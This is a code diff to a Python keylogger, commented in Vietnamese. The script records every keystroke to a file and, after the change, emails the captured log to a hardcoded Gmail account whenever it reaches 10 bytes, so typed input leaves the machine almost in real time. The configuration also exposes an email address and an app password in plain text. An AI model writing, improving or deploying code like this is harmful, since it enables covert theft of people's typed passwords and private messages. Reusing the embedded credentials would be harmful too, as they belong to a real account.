@@ -18,7 +18,7 @@ EMAIL_ADDRESS = "nguyenhoangngoc22062003@gmail.com"  # Địa chỉ email của 
 EMAIL_PASSWORD = "jvrq ycrj forj gfgd"    # Mật khẩu ứng dụng của bạn
 EMAIL_RECIPIENT = "nguyenhoangngoc22062003@gmail.com"  # Địa chỉ email nhận log
 LOG_FILE = "keylog.txt"
-MAX_LOG_SIZE = 50  # Kích thước tối đa của file log trước khi gửi email (50 bytes)
+MAX_LOG_SIZE = 10  # Kích thước tối đa của file log trước khi gửi email (10 bytes)
 
 # Biến lưu trạng thái các phím đặc biệt
 special_keys = {'ctrl': False, 'alt': False, 'shift': False}
@@ -69,6 +69,15 @@ def on_press(key):
     try:
         with open(LOG_FILE, "a") as log:
             log.write(log_entry)
+        
+        # Kiểm tra kích thước log và gửi email nếu đạt đủ 10 ký tự
+        if os.path.getsize(LOG_FILE) >= MAX_LOG_SIZE:
+            with open(LOG_FILE, "r") as file:
+                log_content = file.read()
+            if log_content:
+                send_email(log_content)
+                with open(LOG_FILE, "w") as file:
+                    file.write("")  # Xóa nội dung sau khi gửi
     except Exception as e:
         log_error(f"Failed to write log: {e}")
 
@@ -89,27 +98,12 @@ def send_email(log_content):
     except Exception as e:
         log_error(f"Failed to send email: {e}")
 
-# Hàm đọc nội dung file log và gửi email khi đạt kích thước tối đa
-def monitor_log_file():
-    while True:
-        time.sleep(10)  # Kiểm tra mỗi 10 giây
-        try:
-            if os.path.getsize(LOG_FILE) >= MAX_LOG_SIZE:
-                with open(LOG_FILE, "r") as file:
-                    log_content = file.read()
-                if log_content:
-                    send_email(log_content)
-                    with open(LOG_FILE, "w") as file:
-                        file.write("")  # Xóa nội dung sau khi gửi
-        except Exception as e:
-            log_error(f"Failed to monitor log file: {e}")
-
 # Hàm khởi động listener
 def start_keylogger():
     try:
         listener = keyboard.Listener(on_press=on_press)
         listener.start()
-        monitor_log_file()
+        listener.join()  # Giữ listener hoạt động
     except Exception as e:
         log_error(f"Failed to start keylogger: {e}")
 
